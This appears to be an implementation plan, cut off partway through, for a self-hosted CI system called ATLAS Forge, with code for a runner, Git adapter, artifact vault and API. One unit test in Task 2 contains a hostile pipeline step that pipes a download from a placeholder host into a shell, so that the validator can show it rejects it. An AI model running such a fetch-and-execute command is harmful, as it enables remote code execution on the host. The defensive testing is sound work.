# ATLAS Forge Bootstrap Runner + CI Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Bootstrap an ATLAS-controlled development path that can hold a Git-compatible source copy, execute the current ATLAS CI commands on an ATLAS-owned runner, persist logs and checksum-verified artifacts, and continue operating when GitHub or GitHub Actions is unavailable.

**Architecture:** This first Forge milestone is intentionally single-host and filesystem-backed so it can become operational quickly without creating a new mandatory cloud dependency. `packages/forge-core` owns provider-independent states and pipeline contracts; `packages/forge-git` owns local Git operations; `packages/forge-runner` executes exact-SHA jobs without a shell; `packages/forge-artifacts` stores content-addressed build evidence; `apps/forge-api` owns queue/persistence/auth/health. GitHub is only a normal Git remote/mirror in this milestone, so a mirror outage is degraded state rather than a pipeline failure.

**Tech Stack:** Node.js 22, TypeScript 5.8, npm workspaces, Vitest 3, standard Git CLI, Node built-ins (`node:http`, `node:child_process`, `node:crypto`, `node:fs`, `node:path`), Linux/systemd for the first ATLAS-owned host.

**Spec:** `docs/superpowers/specs/2026-09-06-atlas-forge-sovereign-devops-design.md`

## Global Constraints

- Work on `release/atlas-a-z`; keep `main` production-stable until the full A-Z closure gate is green.
- Use standard Git semantics; do not invent a proprietary source format.
- GitHub is an optional mirror/provider and MUST NOT be required for local source operations or CI execution.
- CI jobs execute in disposable workspaces and receive no implicit production credentials.
- Pipeline commands are versioned with source and executed with `shell: false`.
- A run is always bound to an exact source SHA; the runner verifies checked-out `HEAD` before executing steps.
- Distinguish `failed` test/build outcomes from `infrastructure_error` and `timed_out` outcomes.
- Secrets remain outside Git; the first host reads control/runner tokens only from environment files with restrictive permissions.
- Artifacts are immutable after publication and are identified by SHA-256 manifest digest.
- Provider failures surface as `degraded` or `unavailable`; they do not silently become successful states.
- Every sensitive mutation emits ATLAS audit evidence with correlation ID.
- This plan implements Forge Milestone 1 only: source continuity, runner, CI evidence, artifact vault, health, and provider-neutral Git mirror sync. Internal review UI, multi-host scheduler, remote artifact transport, secret vault, release UI, and full production deployment engine get separate plans after this bootstrap path is working.
- The existing `test:e2e` script is not treated as proven until the repository contains and verifies its Playwright dependency/config. This milestone uses a sovereign integration E2E test plus the existing unit/integration/build gates and must not claim the full A-Z application E2E gate is complete.

---

## File Map

### Shared governance
- Modify: `packages/core/src/rbac.ts`
- Modify: `tests/unit/core.test.ts`

### Forge Core
- Create: `packages/forge-core/package.json`
- Create: `packages/forge-core/tsconfig.json`
- Create: `packages/forge-core/src/types.ts`
- Create: `packages/forge-core/src/stateMachine.ts`
- Create: `packages/forge-core/src/pipeline.ts`
- Create: `packages/forge-core/src/index.ts`
- Create: `tests/unit/forge-core.test.ts`
- Create: `.atlas/forge/pipelines/atlas-ci.json`

### Local Git service
- Create: `packages/forge-git/package.json`
- Create: `packages/forge-git/tsconfig.json`
- Create: `packages/forge-git/src/gitRepository.ts`
- Create: `packages/forge-git/src/mirror.ts`
- Create: `packages/forge-git/src/index.ts`
- Create: `tests/integration/forge-git.test.ts`

### Runner
- Create: `packages/forge-runner/package.json`
- Create: `packages/forge-runner/tsconfig.json`
- Create: `packages/forge-runner/src/environment.ts`
- Create: `packages/forge-runner/src/executor.ts`
- Create: `packages/forge-runner/src/localCli.ts`
- Create: `packages/forge-runner/src/apiClient.ts`
- Create: `packages/forge-runner/src/daemon.ts`
- Create: `packages/forge-runner/src/index.ts`
- Create: `tests/unit/forge-runner.test.ts`

### Artifact Vault
- Create: `packages/forge-artifacts/package.json`
- Create: `packages/forge-artifacts/tsconfig.json`
- Create: `packages/forge-artifacts/src/manifest.ts`
- Create: `packages/forge-artifacts/src/filesystemArtifactStore.ts`
- Create: `packages/forge-artifacts/src/index.ts`
- Create: `tests/unit/forge-artifacts.test.ts`

### Forge API
- Create: `apps/forge-api/package.json`
- Create: `apps/forge-api/tsconfig.json`
- Create: `apps/forge-api/src/config.ts`
- Create: `apps/forge-api/src/fileStateStore.ts`
- Create: `apps/forge-api/src/auth.ts`
- Create: `apps/forge-api/src/fileAuditSink.ts`
- Create: `apps/forge-api/src/server.ts`
- Create: `apps/forge-api/src/main.ts`
- Create: `tests/integration/forge-api.test.ts`

### Operations and final continuity proof
- Create: `scripts/forge/bootstrap-local-repository.sh`
- Create: `scripts/forge/sync-git-mirror.sh`
- Create: `infra/forge/systemd/atlas-forge-api.service`
- Create: `infra/forge/systemd/atlas-forge-runner.service`
- Create: `infra/forge/forge.env.example`
- Create: `docs/operations/atlas-forge-bootstrap.md`
- Create: `tests/integration/forge-sovereign-ci.test.ts`
- Create: `.gitignore`
- Modify: `package.json`
- Modify: `package-lock.json`

---

### Task 1: Forge domain contracts, state transitions, and RBAC

**Files:**
- Create: `packages/forge-core/package.json`
- Create: `packages/forge-core/tsconfig.json`
- Create: `packages/forge-core/src/types.ts`
- Create: `packages/forge-core/src/stateMachine.ts`
- Create: `packages/forge-core/src/index.ts`
- Modify: `packages/core/src/rbac.ts`
- Modify: `tests/unit/core.test.ts`
- Create: `tests/unit/forge-core.test.ts`
- Modify: `package.json`
- Modify: `package-lock.json`

**Interfaces:**
- Produces: `ForgeRunStatus`, `ForgeStepDefinition`, `ForgePipelineDefinition`, `ForgeRunRecord`, `ForgeJobRecord`, `ForgeStepResult`, `ForgeArtifactRecord`, `MirrorState`, `assertRunTransition(current, next)`.
- Produces shared permissions: `forge.read`, `forge.repository.read|write`, `forge.pipeline.read|execute`, `forge.runner.read|manage`, `forge.artifact.read`, `forge.release.read|approve|deploy`, `forge.mirror.manage`, `forge.admin`.

- [ ] **Step 1: Write failing Forge state and RBAC tests**

```ts
import { describe, expect, it } from 'vitest';
import { assertRunTransition } from '../../packages/forge-core/src';
import { hasPermission } from '../../packages/core/src';

describe('ATLAS Forge core', () => {
  it('allows normal execution transitions and rejects impossible transitions', () => {
    expect(() => assertRunTransition('queued', 'assigned')).not.toThrow();
    expect(() => assertRunTransition('assigned', 'running')).not.toThrow();
    expect(() => assertRunTransition('running', 'passed')).not.toThrow();
    expect(() => assertRunTransition('passed', 'running')).toThrow(/transition/i);
  });

  it('keeps infrastructure failure distinct from product failure', () => {
    expect(() => assertRunTransition('running', 'failed')).not.toThrow();
    expect(() => assertRunTransition('running', 'infrastructure_error')).not.toThrow();
  });

  it('grants Forge domain permissions only through forge.admin', () => {
    expect(hasPermission(['forge.admin'], 'forge.pipeline.execute')).toBe(true);
    expect(hasPermission(['accounting.admin'], 'forge.pipeline.execute')).toBe(false);
  });
});
```

- [ ] **Step 2: Run the tests and verify RED**

Run:

```bash
npm test -- tests/unit/forge-core.test.ts tests/unit/core.test.ts
```

Expected: FAIL because `packages/forge-core` and Forge permission implication do not exist yet.

- [ ] **Step 3: Add the Forge package and exact core types**

`packages/forge-core/src/types.ts` must define these contracts:

```ts
export type ForgeRunStatus =
  | 'queued'
  | 'assigned'
  | 'running'
  | 'passed'
  | 'failed'
  | 'cancelled'
  | 'timed_out'
  | 'infrastructure_error';

export type MirrorState =
  | 'healthy'
  | 'syncing'
  | 'behind'
  | 'diverged'
  | 'authentication_required'
  | 'rate_limited'
  | 'unavailable';

export type ForgeStepDefinition = {
  readonly id: string;
  readonly command: string;
  readonly args: readonly string[];
  readonly timeoutMs: number;
};

export type ForgePipelineDefinition = {
  readonly id: string;
  readonly version: number;
  readonly steps: readonly ForgeStepDefinition[];
  readonly artifactPaths: readonly string[];
};

export type ForgeStepResult = {
  readonly stepId: string;
  readonly status: Exclude<ForgeRunStatus, 'queued' | 'assigned'>;
  readonly exitCode: number | null;
  readonly startedAt: string;
  readonly finishedAt: string;
};

export type ForgeArtifactRecord = {
  readonly id: string;
  readonly sourceSha: string;
  readonly runId: string;
  readonly digest: string;
  readonly manifestPath: string;
  readonly payloadPath: string;
  readonly createdAt: string;
  readonly verified: boolean;
};

export type ForgeRunRecord = {
  readonly id: string;
  readonly repositoryId: string;
  readonly sourceSha: string;
  readonly pipelineId: string;
  readonly pipelineVersion: number;
  readonly trigger: 'manual' | 'push' | 'review' | 'retry';
  readonly requestedBy: string;
  readonly correlationId: string;
  readonly createdAt: string;
  readonly startedAt: string | null;
  readonly finishedAt: string | null;
  readonly status: ForgeRunStatus;
  readonly artifact: ForgeArtifactRecord | null;
};

export type ForgeJobRecord = {
  readonly id: string;
  readonly runId: string;
  readonly repositoryId: string;
  readonly sourceSha: string;
  readonly pipeline: ForgePipelineDefinition;
  readonly status: ForgeRunStatus;
  readonly assignedRunnerId: string | null;
  readonly stepResults: readonly ForgeStepResult[];
};
```

`packages/forge-core/src/stateMachine.ts`:

```ts
import type { ForgeRunStatus } from './types';

const allowed: Record<ForgeRunStatus, readonly ForgeRunStatus[]> = {
  queued: ['assigned', 'cancelled'],
  assigned: ['running', 'cancelled', 'infrastructure_error'],
  running: ['passed', 'failed', 'cancelled', 'timed_out', 'infrastructure_error'],
  passed: [],
  failed: [],
  cancelled: [],
  timed_out: [],
  infrastructure_error: [],
};

export function assertRunTransition(current: ForgeRunStatus, next: ForgeRunStatus): void {
  if (!allowed[current].includes(next)) {
    throw new Error(`Invalid Forge run transition: ${current} -> ${next}`);
  }
}
```

`packages/forge-core/src/index.ts` exports `types`, `stateMachine`, and later `pipeline`.

- [ ] **Step 4: Extend shared RBAC without weakening existing domains**

Add `ForgePermission` to `packages/core/src/rbac.ts` and change the final implication logic to:

```ts
export type ForgePermission =
  | 'forge.read'
  | 'forge.repository.read'
  | 'forge.repository.write'
  | 'forge.pipeline.read'
  | 'forge.pipeline.execute'
  | 'forge.runner.read'
  | 'forge.runner.manage'
  | 'forge.artifact.read'
  | 'forge.release.read'
  | 'forge.release.approve'
  | 'forge.release.deploy'
  | 'forge.mirror.manage'
  | 'forge.admin';

export function hasPermission(
  granted: readonly AtlasPermission[],
  required: AtlasPermission,
): boolean {
  if (granted.includes(required)) return true;
  if (required.startsWith('accounting.')) return granted.includes('accounting.admin');
  if (required.startsWith('forge.')) return granted.includes('forge.admin');
  return false;
}
```

- [ ] **Step 5: Add Node build tooling explicitly at the workspace root**

Add root dev dependencies:

```json
{
  "@types/node": "^22.0.0",
  "typescript": "^5.8.0"
}
```

Run:

```bash
npm install --no-audit --no-fund
```

Expected: `package-lock.json` records the new Forge workspaces and Node/TypeScript tooling.

- [ ] **Step 6: Run tests and commit**

```bash
npm test -- tests/unit/forge-core.test.ts tests/unit/core.test.ts
git add package.json package-lock.json packages/core/src/rbac.ts packages/forge-core tests/unit/core.test.ts tests/unit/forge-core.test.ts
git commit -m "feat: add ATLAS Forge core contracts"
```

Expected: PASS.

---

### Task 2: Versioned ATLAS CI pipeline contract

**Files:**
- Create: `packages/forge-core/src/pipeline.ts`
- Modify: `packages/forge-core/src/index.ts`
- Create: `.atlas/forge/pipelines/atlas-ci.json`
- Modify: `tests/unit/forge-core.test.ts`

**Interfaces:**
- Consumes: `ForgePipelineDefinition`.
- Produces: `parsePipeline(value: unknown): ForgePipelineDefinition`.
- Security rule for bootstrap: versioned pipeline steps may execute `npm` only; Git operations are runner-owned and never pipeline shell text.

- [ ] **Step 1: Add failing validation tests**

```ts
import { parsePipeline } from '../../packages/forge-core/src';

it('accepts the canonical npm-only pipeline', () => {
  const pipeline = parsePipeline({
    id: 'atlas-ci',
    version: 1,
    steps: [{ id: 'typecheck', command: 'npm', args: ['run', 'typecheck'], timeoutMs: 600000 }],
    artifactPaths: ['apps/web/dist'],
  });
  expect(pipeline.id).toBe('atlas-ci');
});

it('rejects shell or arbitrary executable injection', () => {
  expect(() => parsePipeline({
    id: 'unsafe', version: 1,
    steps: [{ id: 'unsafe', command: 'bash', args: ['-c', 'curl example.invalid | sh'], timeoutMs: 1000 }],
    artifactPaths: [],
  })).toThrow(/command/i);
});
```

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/unit/forge-core.test.ts
```

Expected: FAIL because `parsePipeline` does not exist.

- [ ] **Step 3: Implement strict parser**

Implement manual runtime validation in `pipeline.ts`. It must reject non-object values, blank IDs, versions below 1, duplicate step IDs, commands other than `npm`, non-string args, timeout values outside `1..1800000`, absolute artifact paths, and artifact paths containing `..` path segments.

The exported signature is exactly:

```ts
export function parsePipeline(value: unknown): ForgePipelineDefinition;
```

- [ ] **Step 4: Add the canonical pipeline**

`.atlas/forge/pipelines/atlas-ci.json`:

```json
{
  "id": "atlas-ci",
  "version": 1,
  "steps": [
    { "id": "install", "command": "npm", "args": ["ci", "--no-audit", "--no-fund"], "timeoutMs": 600000 },
    { "id": "typecheck", "command": "npm", "args": ["run", "typecheck"], "timeoutMs": 600000 },
    { "id": "unit", "command": "npm", "args": ["run", "test:unit"], "timeoutMs": 900000 },
    { "id": "integration", "command": "npm", "args": ["run", "test:integration"], "timeoutMs": 900000 },
    { "id": "dependency-audit", "command": "npm", "args": ["audit", "--audit-level=high"], "timeoutMs": 600000 },
    { "id": "build", "command": "npm", "args": ["run", "build"], "timeoutMs": 900000 }
  ],
  "artifactPaths": ["apps/web/dist"]
}
```

- [ ] **Step 5: Verify parser against the checked-in file and commit**

```bash
npm test -- tests/unit/forge-core.test.ts
git add .atlas/forge/pipelines/atlas-ci.json packages/forge-core/src tests/unit/forge-core.test.ts
git commit -m "feat: define ATLAS Forge CI pipeline"
```

Expected: PASS.

---

### Task 3: First-party local Git repository adapter and mirror degradation

**Files:**
- Create: `packages/forge-git/package.json`
- Create: `packages/forge-git/tsconfig.json`
- Create: `packages/forge-git/src/gitRepository.ts`
- Create: `packages/forge-git/src/mirror.ts`
- Create: `packages/forge-git/src/index.ts`
- Create: `tests/integration/forge-git.test.ts`
- Modify: `package-lock.json`

**Interfaces:**
- Produces: `initBareRepository(repositoryPath)`, `resolveCommit(repositoryPath, ref)`, `checkoutExactSha(repositoryPath, sha, workspacePath)`, `syncMirror(repositoryPath, remoteName)`.
- `syncMirror` returns `{ state: MirrorState; message: string }`; network/provider failure is data, not an exception that blocks local CI.

- [ ] **Step 1: Write failing exact-SHA and unavailable-mirror tests**

Create a temporary source repository using `git init`, set local test author identity, commit `package.json`, push it to a temporary bare repository, then assert:

```ts
const sha = await resolveCommit(barePath, 'refs/heads/main');
await checkoutExactSha(barePath, sha, workspacePath);
expect((await execFileAsync('git', ['-C', workspacePath, 'rev-parse', 'HEAD'])).stdout.trim()).toBe(sha);

await execFileAsync('git', ['--git-dir', barePath, 'remote', 'add', 'github', '/missing/provider/repository.git']);
const mirror = await syncMirror(barePath, 'github');
expect(mirror.state).toBe('unavailable');
```

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/integration/forge-git.test.ts
```

Expected: FAIL because `forge-git` does not exist.

- [ ] **Step 3: Implement Git operations with `execFile`, never shell interpolation**

Use `promisify(execFile)` and pass every Git argument as an array. `checkoutExactSha` must:

1. reject SHA values not matching `/^[0-9a-f]{40}$/`;
2. remove/create the disposable workspace directory;
3. `git clone --no-checkout <barePath> <workspacePath>`;
4. `git -C <workspacePath> checkout --detach <sha>`;
5. resolve `HEAD` and throw if it differs from the requested SHA.

`syncMirror` must run `git --git-dir <repo> fetch <remote> --prune` and classify authentication-looking stderr as `authentication_required`, rate-limit-looking stderr as `rate_limited`, and all other provider failures as `unavailable`. It must never force-push divergent history.

- [ ] **Step 4: Run tests and commit**

```bash
npm install --no-audit --no-fund
npm test -- tests/integration/forge-git.test.ts
git add packages/forge-git tests/integration/forge-git.test.ts package-lock.json
git commit -m "feat: add ATLAS Forge local Git adapter"
```

Expected: PASS without any network access.

---

### Task 4: Disposable runner and emergency local CI mode

**Files:**
- Create: `packages/forge-runner/package.json`
- Create: `packages/forge-runner/tsconfig.json`
- Create: `packages/forge-runner/src/environment.ts`
- Create: `packages/forge-runner/src/executor.ts`
- Create: `packages/forge-runner/src/localCli.ts`
- Create: `packages/forge-runner/src/index.ts`
- Create: `tests/unit/forge-runner.test.ts`
- Modify: `package.json`
- Modify: `package-lock.json`

**Interfaces:**
- Consumes: `ForgePipelineDefinition`, exact-SHA workspace from `forge-git`.
- Produces: `sanitizedEnvironment(runId)`, `runStep(step, cwd, onLog)`, `executePipeline(pipeline, cwd, runId, onLog)` and emergency CLI `forge:ci:local`.

- [ ] **Step 1: Write failing runner safety tests**

```ts
it('does not leak ambient ATLAS secrets into jobs', () => {
  process.env.ATLAS_FORGE_CONTROL_TOKEN = 'secret-value';
  const env = sanitizedEnvironment('run-1');
  expect(env.ATLAS_FORGE_CONTROL_TOKEN).toBeUndefined();
  expect(env.CI).toBe('true');
  expect(env.ATLAS_FORGE_RUN_ID).toBe('run-1');
});

it('classifies a missing executable as infrastructure_error', async () => {
  const result = await runStep(
    { id: 'missing', command: 'atlas-command-that-does-not-exist', args: [], timeoutMs: 1000 },
    process.cwd(),
    () => undefined,
  );
  expect(result.status).toBe('infrastructure_error');
});
```

Also test a Node child process that exits `7` yields `failed`, and a child process exceeding a 50 ms timeout yields `timed_out`.

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/unit/forge-runner.test.ts
```

- [ ] **Step 3: Implement safe process execution**

`sanitizedEnvironment` may copy only `PATH`, `HOME`, `TMPDIR`, `TEMP`, `SystemRoot`, and `ComSpec` when present, then sets:

```ts
{
  CI: 'true',
  ATLAS_FORGE_RUN_ID: runId,
  npm_config_audit: 'false',
  npm_config_fund: 'false'
}
```

`runStep` uses `spawn(step.command, [...step.args], { cwd, env, shell: false, stdio: ['ignore', 'pipe', 'pipe'] })`, streams stdout/stderr to `onLog`, enforces `timeoutMs`, and returns a typed step result. `executePipeline` stops at the first non-`passed` step.

- [ ] **Step 4: Implement emergency local CI**

`localCli.ts` must:

1. resolve current repository SHA using `git rev-parse HEAD`;
2. read `.atlas/forge/pipelines/atlas-ci.json`;
3. validate it with `parsePipeline`;
4. execute it in the current checkout;
5. write a JSON evidence record under `${ATLAS_FORGE_HOME:-.atlas-forge}/local-runs/<runId>.json`;
6. exit `0` only when every pipeline step passes.

Add root scripts:

```json
{
  "forge:build": "npm --workspace packages/forge-core run build && npm --workspace packages/forge-git run build && npm --workspace packages/forge-artifacts run build && npm --workspace packages/forge-runner run build && npm --workspace apps/forge-api run build",
  "forge:ci:local": "npm run forge:build && node packages/forge-runner/dist/localCli.js"
}
```

Do not add the `forge:build` command until all referenced workspace build scripts exist by the end of Task 6; during Task 4 use the runner workspace build directly.

- [ ] **Step 5: Test and commit**

```bash
npm install --no-audit --no-fund
npm test -- tests/unit/forge-runner.test.ts
git add packages/forge-runner tests/unit/forge-runner.test.ts package.json package-lock.json
git commit -m "feat: add ATLAS-owned Forge runner"
```

---

### Task 5: Content-addressed filesystem Artifact Vault

**Files:**
- Create: `packages/forge-artifacts/package.json`
- Create: `packages/forge-artifacts/tsconfig.json`
- Create: `packages/forge-artifacts/src/manifest.ts`
- Create: `packages/forge-artifacts/src/filesystemArtifactStore.ts`
- Create: `packages/forge-artifacts/src/index.ts`
- Create: `tests/unit/forge-artifacts.test.ts`
- Modify: `package-lock.json`

**Interfaces:**
- Produces: `buildArtifactManifest(directory)`, `publishDirectory(input)`, `verifyArtifact(record)`.
- Artifact digest is SHA-256 over canonical JSON of sorted relative file paths, sizes, and individual SHA-256 values.

- [ ] **Step 1: Write failing immutability/integrity test**

```ts
const published = await store.publishDirectory({
  sourceDirectory: dist,
  sourceSha: 'a'.repeat(40),
  runId: 'run-1',
});
expect(published.digest).toMatch(/^[0-9a-f]{64}$/);
expect(await store.verifyArtifact(published)).toBe(true);

await writeFile(join(published.payloadPath, 'index.html'), 'tampered');
expect(await store.verifyArtifact(published)).toBe(false);
```

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/unit/forge-artifacts.test.ts
```

- [ ] **Step 3: Implement deterministic manifest and publish**

Walk files recursively, reject symbolic links, normalize relative paths to `/`, sort lexicographically, hash each file with SHA-256, then hash the UTF-8 JSON manifest. Publish into:

```text
<forge-home>/artifacts/<manifest-digest>/manifest.json
<forge-home>/artifacts/<manifest-digest>/payload/<relative files>
```

If the digest directory already exists, verify it and return the existing immutable artifact; if verification fails, raise an integrity error rather than overwrite it.

- [ ] **Step 4: Test and commit**

```bash
npm install --no-audit --no-fund
npm test -- tests/unit/forge-artifacts.test.ts
git add packages/forge-artifacts tests/unit/forge-artifacts.test.ts package-lock.json
git commit -m "feat: add ATLAS Forge artifact vault"
```

---

### Task 6: Filesystem-backed Forge API, queue, audit, and health

**Files:**
- Create: `apps/forge-api/package.json`
- Create: `apps/forge-api/tsconfig.json`
- Create: `apps/forge-api/src/config.ts`
- Create: `apps/forge-api/src/fileStateStore.ts`
- Create: `apps/forge-api/src/auth.ts`
- Create: `apps/forge-api/src/fileAuditSink.ts`
- Create: `apps/forge-api/src/server.ts`
- Create: `apps/forge-api/src/main.ts`
- Create: `tests/integration/forge-api.test.ts`
- Modify: `package.json`
- Modify: `package-lock.json`

**Interfaces:**
- Produces HTTP contracts:
  - `GET /healthz`
  - `POST /v1/runs`
  - `POST /v1/jobs/claim`
  - `POST /v1/jobs/:jobId/log`
  - `POST /v1/jobs/:jobId/complete`
  - `GET /v1/runs/:runId`
- Control routes require `ATLAS_FORGE_CONTROL_TOKEN`; runner routes require `ATLAS_FORGE_RUNNER_TOKEN`.

- [ ] **Step 1: Write failing API contract test**

Start `createForgeServer` on port `0` with a temporary Forge home. Assert:

```ts
expect((await fetch(`${base}/healthz`)).status).toBe(200);

const unauthorized = await fetch(`${base}/v1/runs`, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ repositoryId: 'atlas', sourceSha: 'a'.repeat(40), pipelineId: 'atlas-ci', requestedBy: 'test' }),
});
expect(unauthorized.status).toBe(401);

const created = await fetch(`${base}/v1/runs`, {
  method: 'POST',
  headers: { authorization: 'Bearer control-test', 'content-type': 'application/json' },
  body: JSON.stringify({ repositoryId: 'atlas', sourceSha: 'a'.repeat(40), pipelineId: 'atlas-ci', requestedBy: 'test' }),
});
expect(created.status).toBe(201);
```

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/integration/forge-api.test.ts
```

- [ ] **Step 3: Implement explicit configuration and constant-time token checks**

`ForgeApiConfig` requires:

```ts
export type ForgeApiConfig = {
  home: string;
  repositoriesRoot: string;
  pipelinesRoot: string;
  controlToken: string;
  runnerToken: string;
  bindHost: string;
  port: number;
};
```

Reject startup if either token is shorter than 32 characters in non-test mode. `auth.ts` compares UTF-8 token buffers with `timingSafeEqual` only after equal-length check.

- [ ] **Step 4: Implement atomic filesystem state**

Persist one JSON file per run/job under:

```text
<home>/state/runs/<runId>.json
<home>/state/jobs/<jobId>.json
<home>/logs/<jobId>.log
<home>/audit/events.jsonl
```

Every JSON mutation writes to a sibling temporary file with mode `0600`, `fsync`s the file, then renames it atomically. `claim` selects the oldest queued job, moves job/run `queued -> assigned`, records `assignedRunnerId`, and returns the full exact pipeline definition.

- [ ] **Step 5: Implement endpoint semantics**

`POST /v1/runs` validates repository ID against `/^[a-z0-9][a-z0-9-]{0,63}$/`, source SHA against `/^[0-9a-f]{40}$/`, loads `<pipelinesRoot>/<pipelineId>.json`, validates with `parsePipeline`, creates one run and one job, and emits audit action `forge.run.create`.

`POST /v1/jobs/claim` accepts `{ "runnerId": "runner-..." }`; returns `204` when no work exists.

`POST /v1/jobs/:id/log` accepts `{ "line": "..." }`, caps each line at 16 KiB, strips NUL bytes, and appends the timestamped log line.

`POST /v1/jobs/:id/complete` accepts `status`, exact `stepResults`, and nullable artifact record. Only terminal statuses are accepted. It updates both job and run and emits `forge.run.complete`.

`GET /healthz` returns `200` with `{ "status": "ready" }` only when state, repositories, logs, and artifact roots are readable/writable; otherwise `503` with `{ "status": "degraded", "checks": [...] }`.

- [ ] **Step 6: Add compiled workspace scripts**

Each Node Forge package/app uses a package-local `tsconfig.json` extending `../../tsconfig.base.json` while overriding:

```json
{
  "compilerOptions": {
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "noEmit": false,
    "isolatedModules": false,
    "types": ["node"],
    "rootDir": "src",
    "outDir": "dist",
    "declaration": true
  }
}
```

Each package exposes `./dist/index.js`; executable workspaces add `build` and `start` scripts. Now add the root `forge:build` and `forge:ci:local` scripts defined in Task 4 plus:

```json
{
  "forge:api:start": "node apps/forge-api/dist/main.js",
  "forge:runner:start": "node packages/forge-runner/dist/daemon.js"
}
```

- [ ] **Step 7: Test, type-build Forge, and commit**

```bash
npm install --no-audit --no-fund
npm test -- tests/integration/forge-api.test.ts
npm run forge:build
git add apps/forge-api packages/forge-core packages/forge-git packages/forge-runner packages/forge-artifacts package.json package-lock.json tests/integration/forge-api.test.ts
git commit -m "feat: add ATLAS Forge orchestration API"
```

Expected: API tests PASS and all Forge packages compile to `dist`.

---

### Task 7: Network runner client and one-job daemon

**Files:**
- Create: `packages/forge-runner/src/apiClient.ts`
- Create: `packages/forge-runner/src/daemon.ts`
- Modify: `packages/forge-runner/src/index.ts`
- Modify: `tests/unit/forge-runner.test.ts`
- Create: `tests/integration/forge-runner-api.test.ts`

**Interfaces:**
- Consumes API contracts from Task 6, local repositories at `<repositoriesRoot>/<repositoryId>.git`, and Artifact Vault.
- Produces `ForgeApiClient`, `executeClaimedJob(job, config)`, and `runDaemon(config)`.

- [ ] **Step 1: Write failing runner/API integration test**

The test starts a temporary Forge API, creates a tiny local Git repository with a committed `package.json`, pushes it to `<repos>/atlas.git`, queues a run, then calls `runDaemon({ once: true, ... })`. The test expects the run to leave `queued` and become terminal, the runner log file to contain the executed step ID, and the checked-out SHA to match the queued SHA.

- [ ] **Step 2: Verify RED**

```bash
npm test -- tests/integration/forge-runner-api.test.ts
```

- [ ] **Step 3: Implement API client with no token logging**

`ForgeApiClient` constructor receives `{ baseUrl, runnerToken }`. Methods:

```ts
claim(runnerId: string): Promise<ForgeJobRecord | null>;
appendLog(jobId: string, line: string): Promise<void>;
complete(jobId: string, result: { status: ForgeRunStatus; stepResults: readonly ForgeStepResult[]; artifact: ForgeArtifactRecord | null }): Promise<void>;
```

For HTTP non-2xx, throw an error containing status code and response body capped at 4 KiB; never include request Authorization header.

- [ ] **Step 4: Implement claimed-job execution**

For each job:

1. derive repository path only from validated `repositoryId` and configured `repositoriesRoot`;
2. create `<home>/workspaces/<jobId>`;
3. `checkoutExactSha` into that directory;
4. transition `assigned -> running` through API log evidence;
5. execute pipeline sequentially;
6. if passed, publish each configured artifact directory through `FilesystemArtifactStore`; the bootstrap pipeline has exactly one path;
7. complete the job with terminal status and artifact record;
8. recursively delete the disposable workspace in `finally`.

- [ ] **Step 5: Implement daemon polling**

The daemon reads `ATLAS_FORGE_API_URL`, `ATLAS_FORGE_RUNNER_TOKEN`, `ATLAS_FORGE_RUNNER_ID`, `ATLAS_FORGE_HOME`, and `ATLAS_FORGE_REPOSITORIES_ROOT`. Default poll interval is 2000 ms. `--once` or test config exits after one claim/no-claim cycle. SIGTERM stops after the active job completes or after its current step times out.

- [ ] **Step 6: Test and commit**

```bash
npm test -- tests/unit/forge-runner.test.ts tests/integration/forge-runner-api.test.ts
npm run forge:build
git add packages/forge-runner tests/unit/forge-runner.test.ts tests/integration/forge-runner-api.test.ts
git commit -m "feat: connect ATLAS Forge runner to orchestrator"
```

---

### Task 8: Bootstrap local authoritative Git copy and systemd services

**Files:**
- Create: `scripts/forge/bootstrap-local-repository.sh`
- Create: `scripts/forge/sync-git-mirror.sh`
- Create: `infra/forge/systemd/atlas-forge-api.service`
- Create: `infra/forge/systemd/atlas-forge-runner.service`
- Create: `infra/forge/forge.env.example`
- Create: `docs/operations/atlas-forge-bootstrap.md`
- Create: `.gitignore`

**Interfaces:**
- Produces a provider-independent local bare repository and repeatable service installation contract.
- GitHub mirror is optional remote name `github`; sync failure exits nonzero for the sync command but does not stop API/runner services.

- [ ] **Step 1: Write bootstrap shell scripts with strict mode**

`bootstrap-local-repository.sh` begins:

```bash
#!/usr/bin/env bash
set -euo pipefail

SOURCE_REPOSITORY=${1:?usage: bootstrap-local-repository.sh <source-working-copy> <forge-home> <repository-id>}
FORGE_HOME=${2:?forge home required}
REPOSITORY_ID=${3:?repository id required}

[[ "$REPOSITORY_ID" =~ ^[a-z0-9][a-z0-9-]{0,63}$ ]] || { echo "invalid repository id" >&2; exit 64; }
mkdir -p "$FORGE_HOME/repos" "$FORGE_HOME/state/runs" "$FORGE_HOME/state/jobs" "$FORGE_HOME/logs" "$FORGE_HOME/artifacts" "$FORGE_HOME/workspaces"
chmod 700 "$FORGE_HOME"
TARGET="$FORGE_HOME/repos/$REPOSITORY_ID.git"

if [[ ! -d "$TARGET" ]]; then
  git clone --mirror "$SOURCE_REPOSITORY" "$TARGET"
fi

git --git-dir "$TARGET" config receive.denyNonFastForwards true
git --git-dir "$TARGET" fsck --full
printf '%s\n' "$TARGET"
```

`sync-git-mirror.sh` accepts `<bare-repository> <remote-name>`, runs `git fetch --prune` and then `git push --mirror` only when the operator explicitly passes `--push`. It never uses `--force` as an implicit reconciliation mechanism.

- [ ] **Step 2: Add hardened systemd unit contracts**

API unit requirements:

```ini
[Service]
Type=simple
User=atlas-forge
Group=atlas-forge
WorkingDirectory=/opt/atlas/atlasenterprisesuite
EnvironmentFile=/etc/atlas-forge/forge.env
ExecStart=/usr/bin/npm run forge:api:start
Restart=on-failure
RestartSec=3
NoNewPrivileges=true
PrivateTmp=true
ProtectHome=true
ProtectSystem=strict
ReadWritePaths=/srv/atlas-forge
```

Runner unit uses the same hardening and `ExecStart=/usr/bin/npm run forge:runner:start`.

- [ ] **Step 3: Add environment contract without committing secrets**

`infra/forge/forge.env.example` contains non-secret paths/ports only:

```dotenv
ATLAS_FORGE_HOME=/srv/atlas-forge
ATLAS_FORGE_REPOSITORIES_ROOT=/srv/atlas-forge/repos
